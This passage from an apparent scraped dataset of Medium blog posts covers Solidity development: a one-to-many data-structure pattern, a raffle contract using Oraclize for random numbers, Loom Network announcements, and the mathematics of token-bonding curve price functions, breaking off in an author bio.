manyList; Refer to the One in the ManyIf you\u2019ve ever made a simple database, you\u2019ll know that the key pointing to the \u201cOne\u201d goes in the \u201cMany\u201d.struct Many {  // fields about this class  uint manyListPointer; // points to a row on the manyList  bytes32 oneKey; <-- here.}Keep a \u201cMany\u201d list in the \u201cOne\u201dFor this to work, we\u2019ll need a list of all the Many instances related to each One instance. We\u2019re going to treat that in a manner that\u2019s very similar to our general treatment of tables. It\u2019s a table with one column (the Many keys) that goes inside each One instance.struct One {  // fields  uint oneListPointer; // supports the deleteOne() function    // build a table of Many keys with a delete capability  bytes32[] manyKeys;  mapping(bytes32 => uint) manyKeyPointers;}Each \u201cOne\u201d will have a list of the Many keys that refer to it.Get all the Many instances that point to this OneThe array means we can enable something very similar to:SELECT manyKeys FROM One WHERE oneId = ...We\u2019ll need a function to find out how many Many keys point to a given One.function getOneManyCount(bytes32 oneId)   public   constant   returns(uint manyCount) {  if(!isOne(oneId)) throw;  return oneStructs[oneId].manyKeys.length;}We\u2019ll need a function to iterate over the Many keys that point to a given One.function getOneManyAtIndex(bytes32 oneId, uint row)   public   constant   returns(bytes32 manyKey) {  if(!isOne(oneId)) throw;  return oneStructs[oneId].manyKeys[row];}The mapping supports DeleteIf we ever delete one of the Many records, we\u2019ll break referential integrity unless we remove its key from the One it was pointing to. Remember, the Ones keep track of that. We therefore need a way to remove a Many key from a One\u2019s manyKeys array.As we saw when deleting a record from a table (we\u2019re treating this as a table), we can delete from the unordered list of keys efficiently when we know exactly what row the key is on. That\u2019s what this mapping gives us.mapping(bytes32 => uint) manyKeyPointers;This could be a mapping to a struct if there was more than one field involved. In this case, we need the row number and nothing else, so a uint will suffice. The important thing is we can locate a key to delete in the unordered list without difficulty.The secret to deleting a key from an unordered list is to move the last item into the row to delete.Efficient delete from an unordered list.SolidityCRUD is all about how that works and why it\u2019s good.Enforce Referential IntegrityIt\u2019s vital that referential integrity is never broken. For example:Not allowed to delete a One if any Many refer(s) to it.Not allowed to insert a Many if the One doesn\u2019t exist. In some cases (Zero-to-Many), it will be okay to have no One (null) but it\u2019s seldom acceptable to refer to oneID that doesn\u2019t actually exist.If a Many is updated to a different One or if a Many is deleted then the Many key needs to be removed from the manyKeys list in the One that is no longer referred to.Insert a ManyWe insert an instance in the usual way. A Many must have a One, so the oneId is the minimum extra information we need to insert a new Many.We also update the One record. The One records keep a list of all the Many records that point to them which includes the new Many instance.function createMany(bytes32 manyId, bytes32 oneId) onlyOwner returns(bool success) {  if(!isOne(oneId)) throw;  if(isMany(manyId)) throw;   manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;  manyStructs[manyId].oneKey = oneId;     oneStructs[oneId].manyKeyPointers[manyId] =    oneStructs[oneId].manyKeys.push(manyId) - 1;  LogNewMany(msg.sender, manyId, oneId);  return true;}Let\u2019s step through it.Can\u2019t do it unless the Many refers to a One that actually exists.if(!isOne(oneId)) throw;2. Can\u2019t do it if the manyId already exists.if(isMany(manyId)) throw;3. Push the manyId key on to the keys list and set the internal pointer to support possible delete operations.manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;4. The Many must have exactly one One. We know it exists because we checked.manyStructs[manyId].oneKey = oneId;Now we look after the pointers in the One. It\u2019s quite similar to the usual process but it all takes place inside a One instance. It maintains a list of Many instances that point at a specific One instance.5. Push the manyId on to the list and keep track of the row it landed on.oneStructs[oneId].manyKeyPointers[manyId] =    oneStructs[oneId].manyKeys.push(manyId) - 1;6. Success! Log the state change and return true.Delete a ManyWe\u2019ll delete the record in the usual way, removing it from the unordered list of Many keys. We\u2019ll also track down the One record that\u2019s affected by this. We\u2019ll remove the Many key from the list of Many keys that refer to that One instance.In both cases, we use the familiar technique of moving the last item in the unordered list into the row where the key to delete resides, then shortening the list. Since unrelated keys will have moved (whatever happened to be last), we\u2019ll also need to update the relevant pointers to maintain referential integrity.function deleteMany(bytes32 manyId) onlyOwner returns(bool success) {  if(!isMany(manyId)) throw; // non-existant key          // delete from the Many table  uint rowToDelete = manyStructs[manyId].manyListPointer;  bytes32 keyToMove = manyList[manyList.length-1];  manyList[rowToDelete] = keyToMove;  manyStructs[manyId].manyListPointer = rowToDelete;  manyList.length--;          // we ALSO have to delete this key from the list in the   // ONE that was joined to this Many  bytes32 oneId = manyStructs[manyId].oneKey;  rowToDelete = oneStructs[oneId].manyKeyPointers[manyId];  keyToMove = oneStructs[oneId].manyKeys[oneStructs[oneId].manyKeys.length-1];  oneStructs[oneId].manyKeys[rowToDelete] = keyToMove;  oneStructs[oneId].manyKeyPointers[keyToMove] = rowToDelete;  oneStructs[oneId].manyKeys.length--;  LogManyDeleted(msg.sender, manyId);  return true;}Example Implementationcontract Owned {    address public owner;    modifier onlyOwner {if(msg.sender != owner) throw;_;}    function Owned() {owner=msg.sender;}}contract OneToMany is Owned {        // first entity is called a \"One\"        struct OneStruct {        uint oneListPointer; // needed to delete a \"One\"        // One has many \"Many\"        bytes32[] manyKeys;         mapping(bytes32 => uint) manyKeyPointers;        // more app data    }        mapping(bytes32 => OneStruct) public oneStructs;    bytes32[] public oneList;        // other entity is called a \"Many\"        struct ManyStruct {        uint manyListPointer; // needed to delete a \"Many\"        bytes32 oneKey; // many has exactly one \"One\"        // add app fields    }        mapping(bytes32 => ManyStruct) public manyStructs;    bytes32[] public manyList;        event LogNewOne(address sender, bytes32 oneId);    event LogNewMany(address sender, bytes32 manyId, bytes32 oneId);    event LogOneDeleted(address sender, bytes32 oneId);    event LogManyDeleted(address sender, bytes32 manyId);        function getOneCount()        public       constant       returns(uint oneCount) {return oneList.length;}        function getManyCount()       public       constant       returns(uint manyCount){return manyList.length;}        function isOne(bytes32 oneId)       public       constant       returns(bool isIndeed)     {      if(oneList.length==0) return false;      return oneList[oneStructs[oneId].oneListPointer]==oneId;    }        function isMany(bytes32 manyId)       public       constant       returns(bool isIndeed)     {      if(manyList.length==0) return false;      return manyList[manyStructs[manyId].manyListPointer]==manyId;    }        // Iterate over a One's Many keys        function getOneManyCount(bytes32 oneId)       public       constant       returns(uint manyCount)     {      if(!isOne(oneId)) throw;      return oneStructs[oneId].manyKeys.length;    }        function getOneManyAtIndex(bytes32 oneId, uint row)       public       constant       returns(bytes32 manyKey)     {      if(!isOne(oneId)) throw;      return oneStructs[oneId].manyKeys[row];    }        function createOne(bytes32 oneId)       onlyOwner       returns(bool success)     {      if(isOne(oneId)) throw; // duplicate key prohibited      oneStructs[oneId].oneListPointer = oneList.push(oneId)-1;      LogNewOne(msg.sender, oneId);      return true;    }        function createMany(bytes32 manyId, bytes32 oneId)       onlyOwner       returns(bool success)     {      if(!isOne(oneId)) throw;      if(isMany(manyId)) throw; // duplicate key prohibited      manyStructs[manyId].manyListPointer = manyList.push(manyId)-1;      manyStructs[manyId].oneKey = oneId;       // We also maintain a list of \"Many\" that refer to the \"One\", so ...       oneStructs[oneId].manyKeyPointers[manyId] =       oneStructs[oneId].manyKeys.push(manyId) - 1;      LogNewMany(msg.sender, manyId, oneId);      return true;    }        function deleteOne(bytes32 oneId)       onlyOwner       returns(bool succes)     {      if(!isOne(oneId)) throw;      // the following would break referential integrity      if(oneStructs[oneId].manyKeys.length>0) throw;       uint rowToDelete = oneStructs[oneId].oneListPointer;      bytes32 keyToMove = oneList[oneList.length-1];      oneList[rowToDelete] = keyToMove;      oneStructs[keyToMove].oneListPointer = rowToDelete;      oneList.length--;      LogOneDeleted(msg.sender, oneId);      return true;    }            function deleteMany(bytes32 manyId)       onlyOwner       returns(bool success)     {      if(!isMany(manyId)) throw; // non-existant key              // delete from the Many table      uint rowToDelete = manyStructs[manyId].manyListPointer;      bytes32 keyToMove = manyList[manyList.length-1];      manyList[rowToDelete] = keyToMove;      manyStructs[manyId].manyListPointer = rowToDelete;      manyList.length--;        // we ALSO have to delete this key from the list in the ONE      bytes32 oneId = manyStructs[manyId].oneKey;       rowToDelete = oneStructs[oneId].manyKeyPointers[manyId];      keyToMove =     oneStructs[oneId].manyKeys[oneStructs[oneId].manyKeys.length-1];      oneStructs[oneId].manyKeys[rowToDelete] = keyToMove;      oneStructs[oneId].manyKeyPointers[keyToMove] = rowToDelete;      oneStructs[oneId].manyKeys.length--;      LogManyDeleted(msg.sender, manyId);      return true;    }    }Many-to-ManyA Many-to-Many is often implemented with a third table and two one-to-many relationships.Consider an arrangement with two entities; Voters and Issues.Each Voter can cast a ballot on many Issues.Each Issue has (obviously) many Voters.Many-to-Many can be implemented as third type of entity, e.g. Vote.You might arrive at something along these lines as a starting point:Many-to-Many using two One-to-ManyThe goal should always be to make it as simple as possible, but no simpler. If you need referential integrity, then the contract must enforce it.This pattern addresses a worst-case scenario in which referential integrity must be enforced and delete is required for any/all entities in the data structure.Importantly, all update operations use no iteration and minimal conditional logic. Gas prices for insert, update and delete will be predictable, efficient and consistent at any scale.Rob Hitchens is a Canadian smart contract design consultant, co-founder of Ethereum smart contract auditor Solidified.io and a courseware co-author and mentor of Ethereum, Hyperledger Fabric, Hyperledger Sawtooth Lake, Corda, Quorum and Tezos bootcamps by B9lab.", "responses": 3, "tags": ["Ethereum", "Blockchain", "Solidity", "Smart Contracts", "Database"]}, {"title": "Building a Raffle Smart Contract Using Oraclize", "post_link": "https://medium.com/hackernoon/building-a-raffle-contract-using-oraclize-e746e5edff6b?source=search_post", "author_name": "Pablo Ruiz", "author_link": "https://medium.com/@pabloruiz55", "publish_date": "2017-10-24", "last_modified_date": "2019-05-13", "readtime": "8.97", "claps": 211, "voters": 34, "content": "Building a Raffle Smart Contract Using OraclizePablo RuizFollowOct 24, 2017 \u00b7 9 min readGenerating random numbers in Solidity is not simple. For starters, Solidity doesn\u2019t come with a native random function because the deterministic nature of the system.In mathematics and physics, a deterministic system is a system in which no randomness is involved in the development of future states of the system. A deterministic model will thus always produce the same output from a given starting condition or initial state. \u2014 https://en.wikipedia.org/wiki/Deterministic_systemThere are a number of services and APIs that allow us to generate random numbers, but the problem is that they are not decentralized and you have to trust someone else that the generated number is truly random.Additionally, you can\u2019t trust seemingly random values available to the contract, such as blockhash, timestamp, or other miner-defined value. Miners can manipulate these values to such extent, and event choose not to publish a block. For a casino app you can\u2019t just trust miners, but there are a lot of other use cases where you could rely on blockhash for generating a random outcome, as long as the total amount of value resting on the quality of that randomness is lower than what a miner earns by mining a single block. More info on this: https://ethereum.stackexchange.com/questions/419/when-can-blockhash-be-safely-used-for-a-random-number-when-would-it-be-unsafeSo, how can we generate a random number securely inside a Solidity smart contract?There are a few solutions out there that can help us achieve this, such as Randao (Randao: https://github.com/randao/randao.) and Oraclize (http://www.oraclize.it/#services). In this article I\u2019m going to focus on Oraclize, mainly because it\u2019s extremely easy to get started with it and secondly, because it also can be used to do many more things other than generating a random number, such as accessing any other API from inside a Solidity smart contract.Building the Raffle contractIn this tutorial we\u2019ll build a very simple raffle smart contract to show how to use Oraclize to generate a random number. The contract will work as follows:We\u2019ll deploy the contract and set a minimum and maximum number of participants the raffle will accept. Once there are enough participants, the raffle organizer (or anyone for that matter) can execute the function that will have Oraclize generate a random number. With that random number we\u2019ll just select the winner out of the participants\u2019 array.*For this first version we won\u2019t include all the payments logic, so anyone is free to participate but they won\u2019t receive any ETH prize, of course.Project SetupFor this tutorial, we\u2019ll just deploy everything on Remix, using Metamask to connect to Ropsten, as Oraclize won\u2019t work locally or on the JavaScript VM. I\u2019m going to assume you have some basic understanding on how to work with Remix and Metamask. Also, make sure you have at least 3 or 4 accounts with some ether balance as we\u2019ll need it to pay for the gas cost of joining the raffle as well as paying Oraclize to generate the random number (more on this later).Coding the contractIn Remix, create a new file called Raffle.sol, this will be our contract containing all the logic for the raffle.pragma solidity ^0.4.4;contract Raffle {  uint private chosenNumber;  address private winnerParticipant;  uint8 maxParticipants;  uint8 minParticipants;  uint8 joinedParticipants;  address organizer;  bool raffleFinished = false;  address[] participants;  mapping (address => bool) participantsMapping;  event ChooseWinner(uint _chosenNumber,address winner);  event RandomNumberGenerated(uint);  function Raffle(){    address _org = msg.sender;     uint8 _min = 2;     uint8 _max = 10;     require(_min < _max && _min >=2 && _max <=50);    organizer = _org;    chosenNumber = 999;    maxParticipants = _max;    minParticipants = _min;  }function() payable {}function joinraffle(){    require(!raffleFinished);    require(msg.sender != organizer);    require(joinedParticipants + 1 < maxParticipants);    require(!participantsMapping[msg.sender]);    participants.push(msg.sender);    participantsMapping[msg.sender] = true;    joinedParticipants ++;  }function chooseWinner(uint _chosenNum) internal{    chosenNumber = _chosenNum;    winnerParticipant = participants[chosenNumber];    ChooseWinner(chosenNumber,participants[chosenNumber]);}function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    raffleFinished=true;        chooseWinner(0); //We'll replace this with a call to Oraclize service later on.}function getChosenNumber() constant returns (uint) {    return chosenNumber;  }function getWinnerAddress() constant returns (address) {    return winnerParticipant;  }function getParticipants() constant returns (address[]) {    return participants;  }}I\u2019ll go over the most important parts of the code:function Raffle(): The constructor of the contract sets the configuration state variables of the contract, such as the required minimum and maximum participants and who the organizer of the raffle is (for now, the creator of the contract). Notice we are hardcoding these variables, just to make the example simpler, but you could have the constructor receive these parameters. Also, we require there are at least 2 participants and no more than 50. This maximum could also be changed if you wanted.fallback function: I added the fallback function as we\u2019ll need to send Ether to the contract so it can pay for Oraclize\u2019s services. Did you think they would provide their services for free? :) \u2014 More on this later.function joinRaffle(): This function allows the caller to join the raffle. First, we make a few checks to make sure we are not adding a new participant to a raffle that has already finished or that has reached its maximum amount of participants. We also check that the organizer is not the one trying to join and that this person hasn\u2019t already joined. Then we add the new participant to the participants array (so we can later select one of them at random) and we also add it to a participants mapping (which allows us to easy check if that participant had already joined). Having 2 variables that hold the same information feels a bit hacky to me, but given the example is rather simple, I felt we could get away with it.function generateRandomNumber(): This function will be called to have Oraclize generate the random number. Notice we made it public and doesn\u2019t require the organizer to be the one that calls it. This is on purpose, so that if the organizer, for some reason, disappears, the participants can select a winner anyways. This could be changed as well, for example, to allow this mechanism but only after some time has passed. For now, all this function does is set the raffleFinished flag to true (so this function can only be called once) and call the chooseWinner with a 0 as parameter. When we implement Oraclize, instead of sending a hardcoded 0 (which automatically makes the first person who joined the raffle the winner) we\u2019ll generate the random number.function chooseWinner(): This is an internal function that receives an uint which indicates the position of the winner in the participants array. With this number, we also set the address of the winner and fire an event that logs who the winner was so we can later retrieve it and display it.The remaining functions are just used later in the front-end to display the winners.Go ahead and try the contract in Remix. Just copy and paste the code above and deploy the contract. You should be able to join the raffle with different accounts and then, after there are enough participant, you can call generateRandomNumber() to select a winner (It will always be the address at position 0 in the participants array).Now that we have made sure the logic of the raffle is ok, it\u2019s time to use Oraclize to generate a random number for us.Using Oraclize to generate a random numberIntegrating Oraclize in our smart contract is pretty easy and straight-forward. The fist step is to import the Oraclize API in our contract. Add the following line before the Raffle contract declaration.import \"github.com/oraclize/ethereum-api/oraclizeAPI.sol\";contract Raffle is usingOraclize{...}Notice that we also changed Raffle to inherit from usingOraclize.Now that we imported Oraclize, we have access to its functions. One thing you should be aware of is that importing Oraclize this way will fail, for example, if you are using Truffle to compile your contracts. If you are using Truffle, you will have to make a local copy of the Oraclize file and rename it to \u201cusingOraclize.sol\u201d as Truffle needs the file have the same name as the contract.The first thing we will do is add the Oraclize callback function. The way Oraclize works is by first making a query \u2014 we could be querying an external API, Wolfram\u2019s Mathematica, or, like in our case, the built-in random number generator \u2014 which will fire a transaction to an Oraclize contract, and after that gets processed, it fires the callback function we define inside our contract with the corresponding result.This is how the callback function will look like:// the callback function is called by Oraclize when the result is ready// the oraclize_randomDS_proofVerify modifier prevents an invalid proof to execute this function code:// the proof validity is fully verified on-chainfunction __callback(bytes32 _queryId, string _result, bytes _proof){  // If we already generated a random number, we can't generate a new one.  require(!raffleFinished);  // if we reach this point successfully, it means that the attached authenticity proof has passed!  require (msg.sender == oraclize_cbAddress());  if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {    // the proof verification has failed, do we need to take any action here? (depends on the use case)  } else {    // the proof verification has passed    raffleFinished=true;    // for simplicity of use, let's also convert the random bytes to uint if we need    uint maxRange = joinedParticipants; // this is the highest uint we want to get. It should never be greater than 2^(8*N), where N is the number of random bytes we had asked the datasource to return    uint randomNumber = uint(sha3(_result)) % maxRange; // this is an efficient way to get the uint out in the [0, maxRange] range        chooseWinner(randomNumber);    RandomNumberGenerated(randomNumber); // this is the resulting random number (uint)  }}First, we will make sure that raffleFinished is false so we don\u2019t allow this function to be called more than once.Then we are checking that the data we got has not been tampered with while being delivered to the smart contract. You can read more about that here: https://blog.oraclize.it/the-random-datasource-chapter-2-779946e54f49If the verification has passed, meaning the data has not been tampered with, then we proceed to use the random number. We will be calling the chooseWinner() function that we previously used, but instead of passing a hardcoded 0 as parameter, we\u2019ll pass the random number we generated.As you can see, the random number that gets generated uses the joinedPaticipants state variable to determine its max range. We are also firing an event to log the random number we generated.The last thing we have to do is modify our generateRandomNum() function so when someone executes it, it makes the query to Oraclize.function generateRandomNum(){    require(!raffleFinished);    require(joinedParticipants >=minParticipants && joinedParticipants<=maxParticipants);    oraclize_setProof(proofType_Ledger); // sets the Ledger authenticity proof    uint N = 4; // number of random bytes we want the datasource to return    uint delay = 0; // number of seconds to wait before the execution takes place    uint callbackGas = 200000; // amount of gas we want Oraclize to set for the callback function    bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); // this function internally generates the correct oraclize_query and returns its queryId}By calling oraclize_newRandomDSQuery(delay, N, callbackGas) we\u2019ll have Oraclize generate a random number for us, and when it\u2019s ready, the callback function we defined earlier will be fired. oraclize_newRandomDSQuery receives 3 parameters.delay: which is the number of seconds to wait before the execution takes place. We set it to 0 so it executes the callback as soon as we have results.N: which is how many bytes we want the datasource to return. In our case, since we made the raffle to accept up to 50 participants if the organizer wants so, 4 bytes is more than enough.callbackGas: How much gas we will forward Oraclize so it can execute the callback function. We are setting it up to 200.000 which is enough to execute this function. (In my tests, it has consumed around 125.000 gas).And that\u2019s it! You can give it a try in Remix and see how it works. A few considerations and words of advice:Oraclize\u2019s pricing model: As I mentioned before, Oraclize isn\u2019t free. You can check their pricing here: http://docs.oraclize.it/#pricing. Notice that the first query your contract makes is free, then you will have to pay for the transaction. How? The contract executing the query pays for it from it\u2019s balance. So, before you call the generateRandomNum() function, make sure you send some ether to the contract. \u2014 That\u2019s why we included the fallback function.Testing in Remix: Testing your contract can be quite tedious. First, since we are using Oraclize, you can\u2019t test this locally, we need to connect to a testnet (I\u2019m using Ropsten). You should remember that when you call generateRandomNum() it will take 30\u201350 seconds to get mined and then, it will take another minute to actually process the callback function. Also, switching accounts in Metamask + Remix takes some work. Arm yourself with patience.How much gas is needed to execute this? I\u2019m still playing around with the necessary gas required to execute this contract. On Remix, I had to up the limit to 5.000.000 when deploying the contract. Make sure you are also sending enough gas when generating the random number, or else the callback function will fail.The contract we built today allows us to run a simple Raffle that people can join and then a winner is selected by using Oraclize to generate a random number we can be certain hasn\u2019t been tampered with. There\u2019s a lot of room for improvements and new features, such as allowing people to enter the Raffle with ether and win a prize.Let me know in the comments section below if you have any suggestions or if you encounter any problems with the code.", "responses": 5, "tags": ["Ethereum", "Solidity", "Dapps", "Smart Contracts"]}, {"title": "CryptoZombies Lesson 3! Gas, Ownership, Security and more!", "post_link": "https://medium.com/loom-network/cryptozombies-lesson-3-gas-ownership-security-and-more-490bd1d14264?source=search_post", "author_name": "Luke Zhang", "author_link": "https://medium.com/@lukezhang", "publish_date": "2018-01-11", "last_modified_date": "2019-08-19", "readtime": "1.10", "claps": 444, "voters": 30, "content": "CryptoZombies Lesson 3! Gas, Ownership, Security and more!Luke ZhangFollowJan 11, 2018 \u00b7 2 min readIn the past month, over 50,000 people have taken their first steps into learning Solidity programming by making their own CryptoZombies. We\u2019ve been blown away by the positive response so far!With most of the Loom Network team traveling for the holidays and then getting settled in our new NY office, Lesson 3 took a bit longer than expected to ship.But now, at last\u2026 It\u2019s finally here!My CryptoZombie army starting to look formidable\u2026Click here to get started:https://cryptozombies.io/course/In Lesson 3 you will start to upgrade your zombie army, and you\u2019ll learn:How to make parts of your DApp updatableHow to protect core functions with onlyOwnerAll about gas and gas optimization in EthereumSecuring your smart contractsAdding level-ups and cooldowns to your zombies\u2026and more!Again, here\u2019s the link to get started:https://cryptozombies.io/course/P.S. Have questions? Curious about what\u2019s next? Want to join a community of developers learning Ethereum development? Hop on our Telegram chat to join the discussion.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 2, "tags": ["Ethereum", "Blockchain", "Programming", "Development", "Solidity"]}, {"title": "Intro to Building Ethereum DApps (Video)", "post_link": "https://medium.com/loom-network/intro-to-building-ethereum-dapps-video-b437c5fa3c1d?source=search_post", "author_name": "Matthew Campbell", "author_link": "https://medium.com/@kanwisher", "publish_date": "2017-12-12", "last_modified_date": "2019-08-19", "readtime": "1.04", "claps": 270, "voters": 27, "content": "Intro to Building Ethereum DApps (Video)Matthew CampbellFollowDec 12, 2017 \u00b7 2 min readWe recently presented at the Bangkok Python meetup. Everyone was super excited to learn about Ethereum and Solidity.We had over 30 minutes of just questions. We played with the basics of Geth, Node.js, and we even played with an online Solidity IDE to test our code.Below is the video of the meetup, and here is the the code and the slide deck.Matthew Campbell speaks about blockchain development at Bangkok Python MeetupAbout the SpeakerMatthew Campbell is currently running a blockchain startup Loom Network, they have are building a way for poeple to build scalable sidechains for DApps. He is writing a book called \u201cMicroservices in Go\u201d. He has spoke at over 20 international conferences, including GothamGO, Hashicorp Conf, JS Conf, GO India, UK GOlang, MicroXchng, Prometheus Conf. You can see some videos of his previous talks on my YouTube. In the past, he worked at Thomson Reuters, Bloomberg, Gucci, and Cartoon network.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Programming", "Solidity", "Development"]}, {"title": "More price functions for Token-Bonding Curves", "post_link": "https://blog.aventus.io/more-price-functions-for-token-bonding-curves-cfb1ebb5b659?source=search_post", "author_name": "Aventus Network", "author_link": "https://blog.aventus.io/@aventus", "publish_date": "2018-11-15", "last_modified_date": "2018-11-15", "readtime": "11.2", "claps": 125, "voters": 26, "content": "More price functions for Token-Bonding CurvesAventus NetworkFollowNov 15, 2018 \u00b7 12 min readFollowing last week\u2019s article, written by Alexandre Pinto, the author of Arrays in Solidity and Working with Strings in Solidity, today we continue talking about the Token Bonding Curves.In my previous post about Token-Bonding Curves, I showed that Bancor only allows 4 different types of curves. But that does not have to be the whole story, if we allow the reserve ratio to fluctuate. Today, I examine some variants that don\u2019t fit in that scheme.Positive Initial priceI start with simple variants of the Bancor\u2019s curves. The Bancor price curves can all be represented by a function of formwhere k can be any real value and C \u22600.This function always goes through the origin of the graph, that is, the price of a token at supply 0 is also 0.An easy change is to make this a positive price:The above graph shows one such curve,where a standard curve has been pushed up from the x-axis by 6 units. It is still easy to integrate:We can use this to compute the reserve for the two points market in the graph:The corresponding market caps are 108 and 27. It is easy to conclude the reserve ratio is not constant. One way to look at this is that we have an extra rectangle added to an area with a constant reserve ratio. As the supply grows, the relative importance of the lower rectangle\u2019s area diminishes as the area of the rest of the curve increases. That means the reserve ratio is very high for low supplies, but will decrease as the supply grows.There is a lower limit for this ratio, and we can deduce it intuitively. Fix a point X that we want to compute this ratio for, and let the price curve beThere are two parts to the area under the curve: one is the area under the horizontal that represents the initial price (area A); the other is the area between this horizontal and the curve (area B). The market cap, on its turn, includes area A again, and everything between this and the horizontal line that passes through X. If area A were 0, (ie the initial price would be 0) then the reserve ratio would be k. When it is not, area A contributes both to the reserve and the market cap, and so the reserve ratio can only increase. This means that this kind of curve, with a non-null initial price, guarantees that the reserve ratio is at least what the constant ratio would be with a null initial price.This comes at the expense of higher prices for users, who in each trade have to pay a fixed contribution to this excess of reserve.Reserved SupplyAnother variant of the standard curves is one in which the market owner reserves some supply that cannot be traded. This makes more sense in a minting curve (one that creates the tokens when they are sold) than in a deposit curve (one which only transfers existing tokens from its own address to the user\u2019s wallet). In one scenario, these reserved tokens do not affect the curve\u2019s price, and the result is simply that it\u2019s as if they did not exist. In a deposit bonding curve, it\u2019s as good as if these had never been deposited in the curve in the first place.The formula for these curves is:As written, this curve would have the same behaviour to the left ofas it has to the right. The only effect of shifting the curve like this is fix a different value for the price of the first token (this is a more complicated way of achieving the same behaviour of the previous section). But it becomes more interesting if we introduce a change of function at pointand instead define, say, a horizontal function between 0 andThe best way to do that is even to join both variants, and write a price function like this:In this situation, the market owner decides to start a Market but reserves the first batch of tokens at a different price: this could be constant; follow a different curve; or even the tokens could be declared as non- tradable, and the price function simply would not be defined in this range. It also sets a minimum price for all future tokens, thus guaranteeing a minimum reward for the owners of the reserved supply who wish to sell their tokens to the curve. And of course, this curve also guarantees a minimum reserve ratio of k.The reserve itself now has to be calculated in two parts, one for each branch of the function, but aside from that, there is nothing mathematically new in this function. The formula for the reserve is this:Quasi-polynomial function typesThe polynomial functions examined in the post referred previously do not exhaust all the capabilities. If we relax the fixed reserve requirement, we could experiment with other functions. A good way to choose a function is to think a priori of the behaviour and incentives we want to enforce in the market, and then see how to model them. We can see an example of this in this post by Wilson Lau, where the following function is derived (in general terms):Despite the logarithm in the exponent, this can still be rewritten asforwhich falls exactly in the previous case of the reserved supply.But there is also a second formula that is another kettle of fish, and introduces a whole new shape:There are 5 different parameters here, which complicate things a little. We can rewrite the above like this:which is not an immediate improvement but clarifies something: the dominant term here is of the formwhich, once it turns positive, is a function that grows extremely slow. For reference, it turns 1 forit is 2 forand it turns 3 forGiven this rate of growth, for most practical applications it can probably be considered a constant, which places the above price formula in the company of a more boring class of function likeBut this happens only after x turns smooth. It is a wholly different affair for small values of x, where the price function plunges almost vertically (depending on the choice of constants), until turning around and emulating a simple power function. This initial drop in value may not be suitable for normal market incentives, so study your curve well before implementing one, and in particular have an idea of the maximum and minimum range of supply the market is going to work. Here is an example of 3 curves of this type:Exponential FunctionsThe last example introduced the possibility of using the variable in the exponent (albeit tempered by a double logarithm function). This opens the door to the simple but dramatic exponential function. On the surface, its graph is similar to power functions of exponent larger than 1 and for positive variable. When the variable is negative, these functions are radically different: the exponential function will seem to hug the horizontal axis, being almost a horizontal line, but the power functions will be a symmetric of the positive side of the graph: if the exponent\u2019s numerator is even, it will be symmetric around the y-axis; if it is odd, it will be symmetric around the origin point. Another difference is that the power functions pass through the origin of the chart, and a vanilla exponential function does not. But with a little tweaking, we can write an exponential that does, eg:Despite the similarities, the exponential function is NOT like a power function: it grows much, much faster than any polynomial function (for large enough x). An example of this is in the next figure, that shows the exact same functions as above for modest, but larger, values of supply (up to 20). See how the exponential function takes off in relation to the others.The exponential function has a very simple integral, and we can easily check that it does not produce a constant ratio. Below, I list a generic exponential price function, the corresponding reserve and the calculation of the reserve ratio.The reserve ratio iswhich shows this varies with the supply, and so is not constant.Logarithmic FunctionsThe logarithmic function is like the mirror of the exponential function. While the exponential function grows very fast and approximates a vertical curve, the logarithmic function grows very slowly, and instead approximates a horizontal.The next figure shows a comparison of the logarithmic function with power functions of exponentsTheir approximate shapes are similar, and one could think the logarithmic function (in a dashed line) to be just of the same type as the power functions. It does overtake two of the others, and from this small example it looks like it could dominate them. However, this is short lived behaviour. The truth is that as S tends to infinity, the logarithmic function grows slower and slower and slower, until it is overtaken by all other power functions.The graph below shows the same functions in the vicinity of S= 90000 where the log function is already the smallest of the bunch.The integral ofis more complicated than the previous ones:Potential drawbacks of this function include the necessity to implement a logarithmic function, since this is not available in solidity off the shelf. It also is not easy to generalise the above function itself by increasing the degree oftowhich includes a trigonometric function in the integral. Higher exponents don\u2019t even have a closed integral formula.Negative ExponentialAn interesting alternative to the logarithm function may be the negative exponential. Unlike the logarithm, which grows indefinitely and tends to infinitely (albeit at a very slow pace), the negative exponential has a true horizontal asymptote, meaning that it will approximate a true horizontal function and never go over a limit value. For example:approximates the maximum value C. The rise of the function is steep forand the passage to the near-horizontal regime is almost abrupt. To make the rise softer, we can make a much smaller, as long as it is still positive.The integral (and therefore the reserve) is not complicated:Here is an example graph:ConclusionIn this long post, I have gone over several possible price functions for Token-Bonding Curves (TBC), and talked a little about their properties and how to compute their integral. The choice of function should primarily be dictated by the desired incentive, possibly by sketching a chart with the desired behaviour and then identifying a function close to it.Importantly, any choice must then be validated according to the ease or difficulty of implementing the necessary functions. In a TBC, we want both to sell and buy tokens from the curve. We only need to compute the integral of the price function if we want to sell or buy a given number of tokens, but if we want to buy or sell tokens equivalent to a given amount of the reserve currency, then we need the inverse function of this integral.To ease on the maths (which is already rather heavy) I have not given any of these inverse functions. This is a bigger challenge than it seems on the surface. For example, the inverse of the reserve for a function in the section \u201cPositive initial price\u201d would involve solving a polynomial equation of the kindwhich for high values of k is not straightforward.The exponential functions would not pose much of a problem, nor would the simpler function in \u201cQuasi-polynomial function types\u201d. The second kind in this section, however, would be very hard to solve analytically for both the reserve and its inverse. This also applies to the inverse of the reserve for a logarithmic function. Finally, even the negative exponential reserve is not easy to invert.This makes it difficult to use most of the functions in this list in a TBC where we want to specify a currency value instead of the number of tokens to buy or sell (which is common in financial markets), but it is possible to provide a market that does not include the former. This is more similar to the material world, where many markets only work that way: we usually don\u2019t buy 20$ worth of apples or meat, but rather look for a specified quantity or weight.About the AuthorAlex is a software engineer at Aventus, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in 